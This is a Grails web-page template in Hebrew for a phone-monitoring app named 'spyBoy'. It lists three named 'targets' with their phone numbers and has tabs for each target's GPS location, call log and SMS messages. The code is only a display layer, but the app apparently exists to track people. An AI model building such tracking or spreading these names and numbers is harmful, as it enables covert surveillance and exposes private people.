﻿<!DOCTYPE html>
<html>
	<head>
		<meta name="layout" content="base_layout"/>
	</head>
<body>


<!-- Content Wrapper / Start -->
<div id="content-wrapper">


<!-- Titlebar
================================================== -->
<section id="titlebar">
	<!-- Container -->
	<div class="container">
	
		<div class="eight columns">
			<h2>לקוחות</h2>
		</div>
		
		<div class="eight columns">
			<nav id="breadcrumbs">
				<ul>
					<li>אתה נמצא כאן :</li>
					<li><a href="#">בית</a></li>
					<li><a href="#">ספייבוי</a></li>
					<li>מטרות</li>
				</ul>
			</nav>
		</div>

	</div>
	<!-- Container / End -->
</section>


<!-- Content
================================================== -->

<!-- Container -->
<div class="container">


<!-- Tabs
================================================= -->
	<div class="sixteen columns" style="padding-top:10px;">
	
			<!-- Tabs Navigation -->
			<ul class="tabs-nav">
				<li class="active"><a href="#tab1">איתן ברון : 054-3033425</a></li>
				<li><a href="#tab2">ארז ברון : 054-3334443</a></li>
				<li><a href="#tab3">איילת ברון : 053-2234431</a></li>
			</ul> 
 
			<!-- Tabs Content --> 
			<div class="tabs-container" style="min-height:700px;">
				<div class="tab-content" id="tab1">					
					<g:include view="spyBoy/contacts.gsp"/>					
					<!-- Tabs ================================================= -->
					<div class="columns">						
						<!-- Tabs Navigation -->
						<ul class="tabs-nav">
							<li class="active"><a href="#locationTab">מיקום(GPS)</a></li>
							<li><a href="#callLogTab">יומן שיחות</a></li>
							<li><a href="#smsTab">הודעות(SMS)</a></li>
						</ul>
			
						<!-- Tabs Content -->	
						<div class="tabs-container" style="min-height:500px;">
							<div class="tab-content" id="locationTab">
								<g:include controller="spyBoy" action="location" id="locationAction" />												
							</div>
							<div class="tab-content" id="callLogTab">
								<g:include controller="spyBoy" action="callLog" id="callLogAction"/>
							</div>
							<div class="tab-content" id="smsTab">
								<g:include view="spyBoy/sms.gsp"/>									
							</div>
						</div>
				    </div>				
				</div>
				<div class="tab-content" id="tab2">
				</div>
				<div class="tab-content" id="tab3">
				</div>
			</div>						
	</div>

</div>
<!-- Container / End -->

</div>
<!-- Content Wrapper / End -->

	<script type="text/javascript">					
	  <g:remoteFunction update="contactsAjaxTargetDiv" controller="spyBoy" action="contacts" before="spinner()"/>

	  function spinner(){
		  (function($) {
				$('#spinner').ajaxStart(function() {
					$(this).show();
				}).ajaxStop(function() {
					$(this).hide();
				});
			})(jQuery);
	  }

	  function runEmoji(){
		  jQuery('.emoji').emoji();
	  }
	  
	  $(document).ready(function(){runEmoji();});
	  
	</script>
	</body>
</html>